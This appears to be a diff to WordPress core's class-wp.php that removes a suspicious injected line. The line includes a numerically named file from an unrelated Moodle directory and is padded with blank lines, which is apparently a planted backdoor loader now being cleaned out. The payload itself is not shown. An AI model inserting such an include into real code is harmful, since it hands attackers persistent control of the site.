@@ -782,21 +782,6 @@ class WP {
 			$this->query_posts();
 			$this->handle_404();
 			$this->register_globals();
-include "/var/www/iksd/moodle/admin/classes/privacy/169428";
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 		}
 
 		$this->send_headers();
